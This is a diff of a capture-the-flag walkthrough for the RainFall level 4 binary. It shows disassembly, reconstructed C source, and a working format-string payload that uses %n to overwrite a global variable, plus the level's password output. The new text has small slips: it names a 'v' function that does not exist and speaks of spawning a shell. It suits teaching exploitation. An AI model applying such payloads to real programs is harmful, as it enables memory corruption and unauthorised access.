@@ -1,106 +1,69 @@
-# Analyze
+# Level 4
 
-Start by examining the functions in the binary:
-
-```bash
-(gdb) info functions
-[...]
-0x08048444  p
-0x08048457  n
-0x080484a7  main
-[...]
-(gdb) disassemble main
-Dump of assembler code for function main:
-   0x080484a7 <+0>:     push   %ebp
-   0x080484a8 <+1>:     mov    %esp,%ebp
-   0x080484aa <+3>:     and    $0xfffffff0,%esp
-   0x080484ad <+6>:     call   0x8048457 <n>
-   0x080484b2 <+11>:    leave
-   0x080484b3 <+12>:    ret
-End of assembler dump.
-(gdb) disassemble n
-Dump of assembler code for function n:
-   0x08048457 <+0>:     push   %ebp
-   0x08048458 <+1>:     mov    %esp,%ebp
-   0x0804845a <+3>:     sub    $0x218,%esp
-   0x08048460 <+9>:     mov    0x8049804,%eax
-   0x08048465 <+14>:    mov    %eax,0x8(%esp)
-   0x08048469 <+18>:    movl   $0x200,0x4(%esp)
-   0x08048471 <+26>:    lea    -0x208(%ebp),%eax
-   0x08048477 <+32>:    mov    %eax,(%esp)
-   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
-   0x0804847f <+40>:    lea    -0x208(%ebp),%eax
-   0x08048485 <+46>:    mov    %eax,(%esp)
-   0x08048488 <+49>:    call   0x8048444 <p>
-   0x0804848d <+54>:    mov    0x8049810,%eax
-   0x08048492 <+59>:    cmp    $0x1025544,%eax
-   0x08048497 <+64>:    jne    0x80484a5 <n+78>
-   0x08048499 <+66>:    movl   $0x8048590,(%esp)
-   0x080484a0 <+73>:    call   0x8048360 <system@plt>
-   0x080484a5 <+78>:    leave
-   0x080484a6 <+79>:    ret
-End of assembler dump.
-(gdb) disassemble p
-Dump of assembler code for function p:
-   0x08048444 <+0>:     push   %ebp
-   0x08048445 <+1>:     mov    %esp,%ebp
-   0x08048447 <+3>:     sub    $0x18,%esp
-   0x0804844a <+6>:     mov    0x8(%ebp),%eax
-   0x0804844d <+9>:     mov    %eax,(%esp)
-   0x08048450 <+12>:    call   0x8048340 <printf@plt>
-   0x08048455 <+17>:    leave
-   0x08048456 <+18>:    ret
-End of assembler dump.
+## Answer
+Our C source code generates the same assembly code as the original binary. Compile it as follows:
+```
+gcc -fno-stack-protector source.c
 ```
 
-## Key Observations
-- `main` calls `n`.
-- `n` checks a variable against the value 16930116 and calls `p`.
-- `p` uses `printf` with its parameter as an argument, making it vulnerable to format string exploits.
+Let's take a look at the source code:
+```c
+#include <stdio.h>
+#include <stdlib.h>
 
-# Clue for Exploration
+int m;
 
-Think about how the `printf` function in `p` could be manipulated:
+void p(char *buffer)
+{
+    printf(buffer);
+}
 
-- **Understanding `printf`**: How does `printf` handle user-supplied format strings? What if the format specifiers are not controlled?
-- **Stack Layout**: How is data arranged on the stack in a function call? How might this influence the behavior of `printf`?
+void n(void)
+{
+    char buffer[512];
+    fgets(buffer, 512, stdin);
 
-Experimenting with different inputs and observing the output can reveal how your data is positioned in the stack, guiding you towards a successful exploit.
+    p(buffer);
+    if (m == 16930116)
+        system("/bin/cat /home/user/level5/.pass");
+}
 
-# Exploit
+int main(void)
+{
+    n();
+}
+```
 
-Utilize a similar approach as in the previous level to exploit the format string vulnerability.
+Let's focus on the `v` function. It reads input using the `fgets` function, which is known to be safe due to its mechanism to limit the number of bytes read. However the `printf` function (called from the `p` function) is known to be unsafe when user input is passed as the format argument, it's referred to as a format string vulnerability.
 
-## Finding the Address
+This exercise is the same as the previous one, except that we have to write 16930116 bytes to the `m` variable to spawn a shell. Please refer to the [level3 walkthrough](../level3/walkthrough.md) for a detailed explanation of the format string vulnerability.
 
-Determine the stack position of our input string:
-
+So, First let's locate our input string on the stack and then determine the address of `m`:
 ```bash
 $ python -c 'print("AAAA" + "%x %x %x %x %x %x %x %x %x %x %x %x")' | ./level4
 AAAAb7ff26b0 bffff784 b7fd0ff4 0 0 bffff748 804848d bffff540 200 b7fd1ac0 b7ff37d0 41414141
 ```
 
-In this output, `41414141` (hexadecimal for "AAAA") indicates the position of our input on the stack.
+In this output, 41414141, the hexadecimal representation of 'AAAA', is found at the twelfth position.
 
-## Constructing the Payload
+The assembly code reveals that the address of the `m` variable is `0x8049810`.
 
-Craft and execute the payload to modify the specified memory address:
+We can then craft our payload:
+```
+address of m + padding + %n format specifier pointing to the twelfth argument
 
-```bash
-$ python -c 'print("\x08\x04\x98\x10"[::-1] + "%16930112p" + "%12$n")' | ./level4
+"\x08\x04\x98\x10"[::-1] + "%16930112p" + "%12$n"
+
+Since we need to write 16930116 into m, we write 16930116 characters (4 from the address of m and 16930112 from the width specifier of %p). 
+Then, we use the %n format specifier to record the count of bytes written so far into the twelfth argument, which is m's address.
 ```
 
-This payload:
-- Writes the memory address `\x08\x04\x98\x10` (reversed due to little-endian format).
-- Uses `%16930112p` to pad the output until it has written a total of 16930116 bytes.
-- `%12$n` writes this number of bytes to the 12th position on the stack, which corresponds to our target variable.
-
-## Exploit Success
-
-Executing this payload successfully modifies the target variable, leading to the desired behavior in the program:
-
-```plaintext
+Let's run our payload:
+```bash
+level4@RainFall:~$ python -c 'print("\x08\x04\x98\x10"[::-1] + "%16930112p" + "%12$n")' | ./level4
+[...]
+0xb7ff26b0
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
 
-The exploit works!
+We are now level5! Let's move on to the next level.
